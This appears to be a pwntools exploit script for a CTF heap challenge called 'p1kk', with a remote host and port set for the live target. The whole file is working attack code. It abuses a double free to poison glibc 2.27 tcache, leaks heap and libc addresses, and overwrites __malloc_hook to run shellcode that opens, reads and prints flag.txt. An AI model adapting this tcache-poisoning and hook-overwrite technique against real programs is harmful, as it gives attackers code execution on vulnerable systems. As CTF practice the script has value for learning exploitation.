
from pwn import *
import re, struct
from dbg_utils import *


# debug / remote 
LOCAL = True
DEBUG = False   

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF("./p1kk")
libc = ELF("/home/lt/gnu/libc/glibc-2.27/build/libc.so")

if LOCAL :
    p = process("./p1kk")
else :
    p = remote('39.98.64.24', 9091)


libc_base = 0x7f37f9bbb000 #0x7ffff7a21000
elf_base = 0x555555554000
first_chunk = 0x5565960bb260 #0x555555767260 
heap_base = 0x5565960bb000 #0x555555757000
p_left_count = 0x000555555756020
p_note_list = 0x555555756100
p_size_list = 0x5555557560E0


gdb_cmd = dbg_pie(p, {
    'elf_base': elf_base,
    'notes': p_note_list,
    'menu': 0x555555555150,
    'plc': p_left_count
    }) + '''
b free
c
'''

if LOCAL and DEBUG:
    gdb.attach(p, gdb_cmd)


count = 0

### communication
def cmd(op):
    global count
    count += 1
    p.sendlineafter("Choice: ", str(op))

def add(size):
    cmd(1)
    p.sendlineafter('size: ', str(size))

def delete(idx):
    cmd(4)
    p.sendlineafter('id: ', str(idx))

def show(idx):
    cmd(2)
    p.sendlineafter('id: ', str(idx))

def edit(idx, content):
    cmd(3)
    p.sendlineafter('id: ', str(idx))
    p.sendafter('content: ', content)


### 
# bug analysis
# 1. leak @ show 
# 2. double free @ del
# 
# # 


### pwn 
def pwn():
    global elf_base, libc_base, p_note_list, p_size_list, heap_base

    # idx = 0 -> n0
    add(0x100)
    # idx = 1 -> n1
    # make top chunk and chunk_n0 separate (avoid merging)
    add(0x80)  

    # n = 2 #
    # tcache -> n0 -> n0 -> ... #
    for i in range(2):
        delete(0)
    # idx -> 0 -> no use

    # leak heap 
    show(0)
    p.recvuntil('content: ')
    addr = u64(p.recv(6) + '\x00' * 2)
    heap_base = addr - first_chunk + heap_base
    chunk_n0 = addr - 0x10
    p.success('leak @ ' + hex(addr))
    p.success('heap_base @ ' + hex(heap_base))

    # 0x55ace2725088 + 0x40 -> tcache entry
    # 0x55ace27250c8 -|
    # 0x55ace2725250 -> chunk_n0
    tcache_entry = chunk_n0 - 0x55ace2725250 + 0x55ace27250c8
    p.success('tcache_entry @ ' + hex(tcache_entry))


    ### after leak heap
    # tcache 
    # entry => chunk_n0
    # count => 2
    # #

    # idx = 2 -> n0
    add(0x100)
    # entry => chunk_n0
    # count => 1

    # prepare write tcache_entry
    edit(2, p64(tcache_entry) + '\n')
    
    # idx = 3 -> n0
    add(0x100)
    # entry => tcache_entry
    # count => 0

    # idx = 4 -> tcache_entry
    add(0x100)
    # entry => ...
    # count = -1 


    ### leak libc 
    # unsorted bin
    delete(0)
    # entry => leak
    # count = -1

    show(0)
    p.recvuntil('content: ')
    buf = p.recvuntil('\n')[:-1]
    p.info(buf)
    leak = u64(buf.ljust(8, '\x00'))
    p.success('leak @ ' + hex(leak))
    # libc_base 0x7fa913202000
    # leak 0x7fa9135b0ca0
    libc_base = leak - (0x7fa9135b0ca0 - 0x7fa913202000)
    p.success('libc_base @ ' + hex(libc_base))

    ### after leak libc
    # 3 times add left 
    # idx 0, 1 => no use
    # idx 2, 3 => chunk_n0
    # idx 4 => tcache_entry
    # #
    
    # prepare for shellcode 
    p.info('prepare for shellcode')
    p_shcode = 0x66660000
    edit(4, p64(p_shcode) + '\n')
    # idx = 5 -> p_shcode
    add(0x100)

    # construct shellcode
    fname = struct.unpack('Q', b'flag.txt')[0]
    shellcode  = asm("xor   rax, rax")
    shellcode += asm("push  rax")
    shellcode += asm("mov   rax, {}".format(hex(fname)))
    shellcode += asm("push  rax")
    shellcode += asm("mov   rdi, rsp")
    shellcode += asm("mov   rsi, 0")
    shellcode += asm("xor   rdx, rdx")
    shellcode += asm("mov   rax, {}"
        .format(hex(libc.symbols['open'] + libc_base)))
    shellcode += asm("call  rax")
    # shellcode += asm("mov   rax, 2")
    # shellcode += asm("int   0x80")
    shellcode += asm("sub   rsp, 0x100")    # buf
    shellcode += asm("mov   rdi, rax")
    shellcode += asm("mov   rsi, rsp")
    shellcode += asm("mov   rdx, 0x100")
    shellcode += asm("mov   rax, {}"
        .format(hex(libc.symbols['read'] + libc_base)))
    shellcode += asm("call  rax")
    # shellcode += asm("xor   rax, rax")
    # shellcode += asm("int   0x80")
    shellcode += asm("mov   rdi, 1")
    shellcode += asm("mov   rsi, rsp")
    shellcode += asm("mov   rdx, rax")
    shellcode += asm("mov   rax, {}"
        .format(hex(libc.symbols['write'] + libc_base)))
    shellcode += asm("call  rax")
    # shellcode += asm("mov   rax, 1")
    # shellcode += asm("int   0x80")

    # write shellcode
    edit(5, shellcode)

    p.info('change malloc_hook')
    edit(4, p64(libc_base + libc.symbols['__malloc_hook']) + '\n')
    # idx = 6 -> __malloc_hook
    add(0x100)
    edit(6, p64(p_shcode) + '\n')


    # idx = 7
    # execve shellcode
    add(100)

    p.interactive()

pwn()

